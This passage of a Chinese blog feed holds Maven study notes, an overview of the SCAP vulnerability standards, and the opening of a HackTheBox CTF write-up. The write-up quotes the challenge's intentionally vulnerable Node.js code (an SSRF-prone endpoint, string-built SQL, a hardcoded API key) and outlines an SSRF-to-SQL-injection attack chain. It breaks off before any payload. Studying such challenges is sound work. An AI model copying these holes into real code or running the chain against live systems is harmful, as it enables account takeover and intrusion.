files</span><br></pre></td></tr></table></figure><p><code>pom.xml</code>文件就是maven的描述文件，里面存放了对应的依赖包名及对应的版本。</p><p><code>src</code>目录存放代码，下面的子目录java文件夹存放java代码，resource文件主要存放资源文件。</p><p>pom.xml文件的基本结构如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.example<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maventest<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-logging<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><p><code>groupId</code>类似于java的包名，一般是公司或者组织名称。</p><p><code>artifactId</code>通常是项目的名称</p><p><code>version</code>就是项目的版本</p><p>通常由这三个元素作为了项目的唯一标识。</p><p><code>dependencies</code>则是当前maven项目所要依赖的包。包的标识也由上面三个因素所确定。当写好依赖后，maven会自动的将依赖包下载到classpath当中。</p><p><strong>注：只有以-SNAPSHOT结尾的版本号会被Maven视为开发版本，开发版本每次都会重复下载依赖，这种SNAPSHOT版本只能用于内部私有的Maven repo，公开发布的版本不允许出现SNAPSHOT。</strong></p><h1 id="2-maven配置"><a href="#2-maven配置" class="headerlink" title="2. maven配置"></a>2. maven配置</h1><p>maven有仓库的概念，所有的依赖都是从仓库中下载的。</p><p>仓库的类型有如下几种：</p><ul><li>本地仓库：电脑上的仓库，默认路径在：<code>~/.m2/repository</code></li><li>私服仓库：一般公司内部自己搭建的仓库</li><li>中央仓库：apache团队维护的仓库</li></ul><p>仓库的查找顺序如下：</p><p><img src="/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210616172647670.png" alt="image-20210616172647670"></p><p>中央仓库的优先级最低，一般是从本地开始查找，没有就找私服仓库，再没有就找中央仓库。一般国内的情况访问中央仓库都比较慢，所以一般在使用仓库的时候都要配置仓库镜像。</p><p><strong>配置仓库镜像</strong>：</p><p>配置文件的位置在：<code>~/.m2/settings.xml</code></p><p>在里面添加如下的配置即可：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirrors</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">id</span>&gt;</span>google-maven-central<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">name</span>&gt;</span>Google Maven Central<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven-central.storage.googleapis.com</span><br><span class="line">        <span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>central<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirrors</span>&gt;</span></span><br></pre></td></tr></table></figure><p><strong>该处最好不要使用阿里云的maven仓库，默认是不带索引的，所以添加到idea中，会无法更新maven索引，也就没法使用dependency自动添加的插件。</strong></p><p>maven依赖查询的网站在：<a href="https://search.maven.org/">https://search.maven.org/</a>搜索关键字即可找到对应的包</p><p><img src="/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210616175234372.png" alt="image-20210616175234372"></p><h1 id="3-maven常用命令"><a href="#3-maven常用命令" class="headerlink" title="3. maven常用命令"></a>3. maven常用命令</h1><p>maven中有几个常用的命令，在IDEA中直接做成了按钮，可以点击实现，但也要学一下命令是怎么回事。</p><p><code>mvn clean</code>：清理编译好的文件</p><p><code>mvn compile</code>：将java代码编译成class文件</p><p><code>mvn test</code>：项目测试</p><p><code>mvn package</code>：根据配置将项目打包成jar或者war</p><p><code>mvn install</code>：将生成的jar包复制到本地的maven仓库中，其他项目就可以使用这个jar包了</p><p><code>mvn deploy</code>：将生成的jar包复制到私有的仓库中，供其他开发者使用</p><p><strong>生命周期Lifecycle</strong></p><p>生命周期包含一系列的阶段（phase），下面是<code>default</code>的声明周期：</p><ul><li>validate</li><li>initialize</li><li>generate-sources</li><li>process-sources</li><li>generate-resources</li><li>process-resources</li><li>compile</li><li>process-classes</li><li>generate-test-sources</li><li>process-test-sources</li><li>generate-test-resources</li><li>process-test-resources</li><li>test-compile</li><li>process-test-classes</li><li>test</li><li>prepare-package</li><li>package</li><li>pre-integration-test</li><li>integration-test</li><li>post-integration-test</li><li>verify</li><li>install</li><li>deploy</li></ul><p>当我们运行<code>mvn pachage</code>时，maven就会执行声明周期，运行到package的phase为止。</p><p>第二个<code>clean</code>的声明周期，由三个phase组成：</p><ul><li>pre-clean</li><li>Clean</li><li>post-clean</li></ul><p>当我们使用<code>mvn</code>命令时，后面跟上的参数就是phase，maven根据生命周期运行到指定的phase。</p><p>例如执行命令<code>mvn clean test</code>，则是先执行clean生命周期到clean，然后再执行default生命周期到test，执行的phase如下：</p><ul><li>Pre-clean</li><li>clean</li><li>validate</li><li>…</li><li>Package</li></ul><p><strong>Goal</strong></p><p>执行一个phase又会触发多个goal，相当于goal是组成phase的一部分，phase又是组成lifecycle的一部分。</p><p>执行compile，对应的goal：compiler:compile</p><p>执行test，对应的goal：compiler:testCompile  surefire:test</p><p>大多数情况，我们只要指定phase，就默认执行这些phase默认绑定的goal，只有少数情况，我们可以直接指定运行一个goal，例如，启动Tomcat服务器：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn tomcat:run</span><br></pre></td></tr></table></figure><p><strong>IDEA中配置自动加载dependency</strong></p><p>maven的中央仓库镜像设置为谷歌的镜像后，通过idea可以自动更新仓库索引，如下图</p><p><img src="/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210616210900735.png" alt="image-20210616210900735"></p><p>更新完了后，在pom.xml的dependencies中就可以进行模糊查找依赖包了。</p><p><img src="/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210616211004143.png" alt="image-20210616211004143"></p><h1 id="4-依赖管理"><a href="#4-依赖管理" class="headerlink" title="4. 依赖管理"></a>4. 依赖管理</h1><p>通常的依赖的配置文件如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>组成依赖的元素有四个：<code>groupId</code>、<code>artifactId</code>、<code>version</code>、<code>scope</code>。</p><p>其中scope表示了依赖的范围，主要的值如下所示：</p><p><img src="/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210616211531581.png" alt="image-20210616211531581"></p><p>依赖还有模块的继承使用方法，具体可以查看<a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1309301243117601">https://www.liaoxuefeng.com/wiki/1252599548343744/1309301243117601</a>。</p><h1 id="5-Archetype"><a href="#5-Archetype" class="headerlink" title="5. Archetype"></a>5. Archetype</h1><p>顾名思义就是模板，maven项目的模板工具包。能够通过这些模板快速创建一些工程。在使用IDEA创建maven工程时，内置了许多模板。</p><p><img src="/2021/06/16/maven%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/image-20210616212336017.png" alt="image-20210616212336017"></p><p>一般我们很少去研究所有的模板，一般常用的模板就那么几个，一般最常用的就是下面这个，拿来创建web站点：</p><p><code>org.apache.maven.archetypes:maven-archtype-webapp</code></p><p>还有其他很多模板，就不再去深究了</p><h1 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h1><ol><li><p><a href="https://www.liaoxuefeng.com/wiki/1252599548343744/1255945359327200">廖雪峰maven教程</a></p></li><li><p><a href="https://www.cnblogs.com/lenve/p/12047793.html">https://www.cnblogs.com/lenve/p/12047793.html</a></p></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;maven很久之前学过，但后面没搞java就基本忘了，基本的打包命令都忘得一干二净。最近准备深入学习下java，头一个要学的便是maven。在此记录下maven的学习笔记。&lt;/p&gt;
&lt;h1 id=&quot;1-maven介绍&quot;&gt;&lt;a href=&quot;#1-maven介绍&quot; class=</summary>
      
    
    
    
    <category term="Program" scheme="http://blog.le31ei.top/categories/Program/"/>
    
    
    <category term="maven" scheme="http://blog.le31ei.top/tags/maven/"/>
    
  </entry>
  
  <entry>
    <title>漏洞管理scap协议</title>
    <link href="http://blog.le31ei.top/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/"/>
    <id>http://blog.le31ei.top/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/</id>
    <published>2021-06-02T13:20:25.000Z</published>
    <updated>2021-06-02T13:20:25.047Z</updated>
    
    <content type="html"><![CDATA[<p>最近工作中了解到了scap协议，需要用到中间的几个模块，遂专门抽时间对scap进行了深入的学习。本文记录一下学习过程，以及自己的相关理解。</p><h1 id="1-概念"><a href="#1-概念" class="headerlink" title="1. 概念"></a>1. 概念</h1><p>scap根据维基百科的解释是安全内容自动化协议，是用于自动化漏洞管理、评估和条款符合检测的一套标准，结合了一系列用于评估软件缺陷和安全相关问题的开放标准，用于系统测试来发现漏洞，并根据漏洞可能造成的影响提供评分标准。是意图将上述开放标准用于自动化漏洞管理、评估和条款符合检测的一套标准。</p><p>简单来说，scap协议就是为了将漏洞管理做一个统一的规范，形成自己特有的生态系统。目前大多数漏洞均有CVE编号，CVE就是Scap的一个部分，主要是为了统一漏洞描述、修补建议、影响范围等，避免不同的厂商对同一个漏洞的定义有不同的定义，从而形成规范化的漏洞管理。本文以最新的SCAP1.3作为介绍的版本。</p><h1 id="2-协议"><a href="#2-协议" class="headerlink" title="2. 协议"></a>2. 协议</h1><p>scap主要由以下协议组成，部分组件为大家所熟悉的：</p><blockquote><ol><li>Asset Identification 资产识别</li><li>Asset Reporting Format (ARF)  资产报告规范</li><li>Common Configuration Enumeration (CCE)  通用配置枚举</li><li>Common Platform Enumeration (CPE) 通用平台枚举</li><li>Open Vulnerability Assessment Language (OVAL) 开放漏洞评估语言</li><li>Open Checklist Interactive Language (OCIL)  开放式交互语言</li><li>Trust Model for Security Automation Data (TMSAD) 安全自动化数据的信任模型</li><li>Extensible Configuration Checklist Description Format (XCCDF) 可扩展配置清单描述格式</li><li>Software Identification (SWID) 软件标识</li></ol></blockquote><p>一般常用的协议如下：</p><p><img src="/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602203848073.png" alt="image-20210602203848073"></p><p>随便打开一个NVD存放的cve漏洞信息，可以找到几个模块的常见使用，第一个就是CVE编号，已经成为业界公用的漏洞标识，</p><p>第二个CVSS评分</p><p><img src="/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602204446373.png" alt="image-20210602204446373"></p><p>第三个CPE信息</p><p><img src="/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602204502667.png" alt="image-20210602204502667"></p><p>可以看到美国的漏洞管理已经形成了统一的标准，采用SCAP这一系列的协议，能够非常标准化的管理所有漏洞。</p><h1 id="3-常见组件和协议"><a href="#3-常见组件和协议" class="headerlink" title="3. 常见组件和协议"></a>3. 常见组件和协议</h1><p><strong>CVE</strong></p><p>通用的漏洞库，基本上常见的组件如果存在漏洞的话，基本会有对应的CVE编号。安全研究者一般在找到通用软件漏洞的时候，也会提交给相关厂商申请CVE编号，可以说现在安全研究者就是以CVE数量作为自己的能力体现。</p><p>CVE编号通常为CVE-2021-xxxx，中间为年份，最后的数字为漏洞编号。CVE网站<a href="https://cve.mitre.org/">https://cve.mitre.org/</a>可以根据编号搜索到对应的漏洞描述。描述中通常包含漏洞影响的组件、影响的范围以及对应的CVSS评分和修复建议等详细信息。</p><p><img src="/2021/06/02/%E6%BC%8F%E6%B4%9E%E7%AE%A1%E7%90%86scap%E5%8D%8F%E8%AE%AE/image-20210602210424116.png" alt="image-20210602210424116"></p><p><strong>CPE</strong></p><p>相当于一个识别码，<strong>SCAP的一种开源实现OPENSCAP采用的思想就是，在服务器中收集软件和系统的CPE信息，然后匹配CVE中对应的指纹来查找漏洞</strong>。</p><p>该方式相对于传统的扫描有如下几种优势：</p><blockquote><ol><li>大部分漏洞不会有POC或者EXP，采用CPE匹配的方式可以检测出来这部分漏洞</li><li>不用主动扫描，不会对网络造成压力</li><li>检测快速精准，比传统的远程扫描有更高 的精准度</li></ol></blockquote><p>但该方式也有他的问题所在</p><blockquote><ol><li>跟离线的配置检查类似，需要采用探针的方式进行检查，对于未发现的灰色资产是没有办法进行检测的，只能对已经发现的纳管资产进行检查</li><li>针对于国产或者小厂商的软件或者系统不存在CPE的情况下，该种方式是没办法进行检测的</li></ol></blockquote><p><strong>CVSS</strong></p><p>通用漏洞评分系统，CVE采用该套评分标准对一个漏洞进行定义评分。目前最新的版本是3.1。此处不详细扩展相关介绍，后期专项学习的时候再详细说明。</p><p>以上就是SCAP中常用的几种协议或者工具，此处仅做简单介绍，有兴趣的话，可查找相关原文进行学习。</p><h1 id="参考文档"><a href="#参考文档" class="headerlink" title="参考文档"></a>参考文档</h1><ol><li><a href="https://zh.wikipedia.org/zh-hans/%E5%AE%89%E5%85%A8%E5%86%85%E5%AE%B9%E8%87%AA%E5%8A%A8%E5%8C%96%E5%8D%8F%E8%AE%AE">维基百科：安全内容自动化协议</a></li><li><a href="https://www.fooying.com/common_vulnerability_management_and_scap/?utm_source=wechat_session&utm_medium=social&utm_oi=1114265509834715136#%E8%AF%84%E5%88%86%E7%A4%BA%E4%BE%8B">通用漏洞管理与SCAP</a></li><li><a href="https://csrc.nist.gov/Projects/Security-Content-Automation-Protocol/Specifications/arf">https://csrc.nist.gov/Projects/Security-Content-Automation-Protocol/Specifications/arf</a></li><li><a href="./SCAP_Standard_introduction_Li.Zhang.pdf">SCAP 标准简介</a></li><li><a href="https://nvd.nist.gov/ncp/repository?orderBy=modifiedDate&orderDirection=desc&startIndex=440">National Checklist Program Repository</a></li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近工作中了解到了scap协议，需要用到中间的几个模块，遂专门抽时间对scap进行了深入的学习。本文记录一下学习过程，以及自己的相关理解。&lt;/p&gt;
&lt;h1 id=&quot;1-概念&quot;&gt;&lt;a href=&quot;#1-概念&quot; class=&quot;headerlink&quot; title=&quot;1. 概念&quot;&gt;</summary>
      
    
    
    
    <category term="安全咨询" scheme="http://blog.le31ei.top/categories/%E5%AE%89%E5%85%A8%E5%92%A8%E8%AF%A2/"/>
    
    
    <category term="scap" scheme="http://blog.le31ei.top/tags/scap/"/>
    
  </entry>
  
  <entry>
    <title>nodejs请求走私与ssrf</title>
    <link href="http://blog.le31ei.top/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/"/>
    <id>http://blog.le31ei.top/2021/05/23/nodejs%E8%AF%B7%E6%B1%82%E8%B5%B0%E7%A7%81%E4%B8%8Essrf/</id>
    <published>2021-05-23T11:12:40.000Z</published>
    <updated>2021-05-23T11:22:40.310Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到hackthebox一道题，关于nodejs请求走私的，学到不少东西，这里记录一下。</p><h1 id="1-先说题目"><a href="#1-先说题目" class="headerlink" title="1. 先说题目"></a>1. 先说题目</h1><p>题目直接给了源码，题目名字是<code>weather app</code>，大家有兴趣可以直接去hackthebox做这道题。</p><p>源码是nodejs的，docker环境，代码功能看起来很简单，一共三个功能。分别是：登录(login)，注册(register)和查询天气的api接口(/api/weather)。</p><p>在注册的代码中检查了来源ip是不是<code>127.0.0.1</code>，使用的是<code>req.socket.remoteAddress</code>，这种情况是没办法绕过的。所以需要通过查询天气的api接口来进行ssrf攻击。</p><p>以下贴一下关键部分的代码</p><p><code>WeatherHelper.js</code>这是查询天气接口的api，endpoint、city和country三个参数可控，可以通过该处进行ssrf攻击</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="title">getWeather</span>(<span class="params">res, endpoint, city, country</span>)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// *.openweathermap.org is out of scope</span></span><br><span class="line">        <span class="keyword">let</span> apiKey = <span class="string">&#x27;10a62430af617a949055a46fa6dec32f&#x27;</span>;</span><br><span class="line">        <span class="keyword">let</span> weatherData = <span class="keyword">await</span> HttpHelper.HttpGet(<span class="string">`http://<span class="subst">$&#123;endpoint&#125;</span>/data/2.5/weather?q=<span class="subst">$&#123;city&#125;</span>,<span class="subst">$&#123;country&#125;</span>&amp;units=metric&amp;appid=<span class="subst">$&#123;apiKey&#125;</span>`</span>); </span><br><span class="line">        </span><br></pre></td></tr></table></figure><p><code>router/index.js</code>：这是路由的代码，有三个关键接口<code>/login</code>、<code>/register</code>、<code>/api/weather</code>，关键代码如下：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/register&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> res.status(<span class="number">401</span>).end();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line">        <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">        <span class="keyword">return</span> db.register(username, password)</span><br><span class="line">            .then(<span class="function">()  =&gt;</span> res.send(response(<span class="string">&#x27;Successfully registered&#x27;</span>)))</span><br><span class="line">            .catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/login&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (username &amp;&amp; password) &#123;</span><br><span class="line">        <span class="keyword">return</span> db.isAdmin(username, password)</span><br><span class="line">            .then(<span class="function"><span class="params">admin</span> =&gt;</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> (admin) <span class="keyword">return</span> res.send(fs.readFileSync(<span class="string">&#x27;/app/flag&#x27;</span>).toString());</span><br><span class="line">                <span class="keyword">return</span> res.send(response(<span class="string">&#x27;You are not admin&#x27;</span>));</span><br><span class="line">            &#125;)</span><br><span class="line">            .catch(<span class="function">() =&gt;</span> res.send(response(<span class="string">&#x27;Something went wrong&#x27;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> re.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">router.post(<span class="string">&#x27;/api/weather&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; endpoint, city, country &#125; = req.body;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (endpoint &amp;&amp; city &amp;&amp; country) &#123;</span><br><span class="line">        <span class="keyword">return</span> WeatherHelper.getWeather(res, endpoint, city, country);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.send(response(<span class="string">&#x27;Missing parameters&#x27;</span>));</span><br><span class="line">&#125;);    </span><br></pre></td></tr></table></figure><p><code>views/database.js</code>：这是创建数据库和两个判断函数的文件。创建的user表中的admin密码字段为随机字段。关键代码如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="function"><span class="title">migrate</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.db.exec(<span class="string">`</span></span><br><span class="line"><span class="string">            DROP TABLE IF EXISTS users;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            CREATE TABLE IF NOT EXISTS users (</span></span><br><span class="line"><span class="string">                id         INTEGER NOT NULL PRIMARY KEY AUTOINCREMENT,</span></span><br><span class="line"><span class="string">                username   VARCHAR(255) NOT NULL UNIQUE,</span></span><br><span class="line"><span class="string">                password   VARCHAR(255) NOT NULL</span></span><br><span class="line"><span class="string">            );</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">            INSERT INTO users (username, password) VALUES (&#x27;admin&#x27;, &#x27;<span class="subst">$&#123; crypto.randomBytes(<span class="number">32</span>).toString(<span class="string">&#x27;hex&#x27;</span>) &#125;</span>&#x27;);</span></span><br><span class="line"><span class="string">        `</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="title">register</span>(<span class="params">user, pass</span>)</span> &#123;</span><br><span class="line">        <span class="comment">// <span class="doctag">TODO:</span> add parameterization and roll public</span></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="keyword">async</span> (resolve, reject) =&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> query = <span class="string">`INSERT INTO users (username, password) VALUES (&#x27;<span class="subst">$&#123;user&#125;</span>&#x27;, &#x27;<span class="subst">$&#123;pass&#125;</span>&#x27;)`</span>;</span><br><span class="line">                resolve((<span class="keyword">await</span> <span class="built_in">this</span>.db.run(query)));</span><br><span class="line">            &#125; <span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">async</span> <span class="function"><span class="title">isAdmin</span>(<span class="params">user, pass</span>)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="built_in">Promise</span>(<span class="keyword">async</span> (resolve, reject) =&gt; &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="keyword">let</span> smt = <span class="keyword">await</span> <span class="built_in">this</span>.db.prepare(<span class="string">&#x27;SELECT username FROM users WHERE username = ? and password = ?&#x27;</span>);</span><br><span class="line">                <span class="keyword">let</span> row = <span class="keyword">await</span> smt.get(user, pass);</span><br><span class="line">                resolve(row !== <span class="literal">undefined</span> ? row.username == <span class="string">&#x27;admin&#x27;</span> : <span class="literal">false</span>);</span><br><span class="line">            &#125; <span class="function"><span class="title">catch</span>(<span class="params">e</span>)</span> &#123;</span><br><span class="line">                reject(e);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>根据以上代码不难看出这道题的解题思路：</p><ol><li>根据weather api的查询接口，发起ssrf攻击</li><li>ssrf对register接口进行攻击，注册一个用户</li><li>注册的时候利用views/database.js中的register函数的注入漏洞</li><li>登录admin账户即可拿到flag</li></ol><p>思路有了，那么几个关键点就出来了，如何发起ssrf攻击？如何利用注入漏洞？</p><h1 